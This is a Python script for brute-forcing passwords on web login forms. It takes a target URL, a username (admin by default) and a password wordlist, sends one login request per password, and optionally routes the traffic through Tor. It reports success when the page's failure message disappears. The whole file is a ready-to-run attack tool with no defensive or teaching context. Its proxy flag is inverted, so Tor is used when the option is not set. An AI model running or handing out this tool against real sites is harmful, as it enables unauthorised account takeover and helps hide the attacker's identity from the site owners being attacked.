#!/usr/bin/python3

try:
    import requests, json, argparse, sys
    from bs4 import BeautifulSoup
    from colorama import Fore, Style
except Exception:
    print()
    print(" [!] Error. Libraries not installed.")
    print(" [i] Run: pip install <package name>")
    print(" [i] Required packages: requests, json, argparse, sys, bs4, colorama.")
    print()
    exit(1)

################################### EDIT ME ###################################
user_parameter = "user"			# User parameter for the request
pass_parameter = "pass"			# Password parameter for the request
submit_parameter1 = "submit"	# Submit parameter for the request
submit_parameter2 = "Login"		# Submit parameter 2 for the request
fail_message = "Error"			# String that appears in the website when failing the login
###############################################################################

# Functions for text with color
def success_text(text, text2):
    print()
    print(" %s%s%s[+] %s >> %s%s" % (Style.RESET_ALL, Style.BRIGHT, Fore.GREEN, text, text2, Style.RESET_ALL))
    print()
def error_text(text):
    print()
    print(" %s%s%s[!] %s%s" % (Style.RESET_ALL, Style.BRIGHT, Fore.RED, text, Style.RESET_ALL))
    print()
def invalid(text):
    sys.stdout.flush()  # Bad passwords on a single line
    sys.stdout.write('\r'+' [!] Bad password: ' + text)
	
#--------------------------------------------------------------------------------
# Arguments for argparse

parser = argparse.ArgumentParser()
parser.add_argument('-t', '--target', help="Put here your target (http / https required)", required=True)
parser.add_argument('-u', '--username', default="admin", help="Put here the username you want to bruteforce (optional)")
parser.add_argument('-w', '--wordlist', help="Put here the wordlist", required=True)
parser.add_argument('-p', '--proxy', action='store_true', help="If you want to use tor proxy (must have tor open) (optional)")
args = parser.parse_args()

# Check for errors
if args.target is not None and "http" not in args.target:
    error_text("Error. URL must contain http / https.")
    exit(1)
elif (args.wordlist is not None) and (".txt" not in args.wordlist):
    error_text("Error. Wordlist must be in txt format.")
    exit(1)
	
#--------------------------------------------------------------------------------
# Check if the proxy is enabled

if args.proxy:
	proxies = ""
elif not args.proxy:
	proxies = {'http': 'socks5://127.0.0.1:9150', 'https': 'socks5://127.0.0.1:9150'}
else:
	error_text(" [!] Error. Invalid proxy. Exiting...")
	exit(1)
	
#--------------------------------------------------------------------------------
# Send the request

with open(args.wordlist, "r") as read_pass_file:  # Read the file
    for line in read_pass_file:  # Read each line
        password = line.strip()
        http = requests.post(args.target, proxies=proxies, data={user_parameter:args.username, pass_parameter:password, submit_parameter1:submit_parameter2})  # Make the request
        content = BeautifulSoup(http.content, "html.parser").get_text()  # Get the content
        if fail_message not in content:
            success_text("Password found!", str(password))
            break
        else:
            invalid(str(password))
			
exit(1)
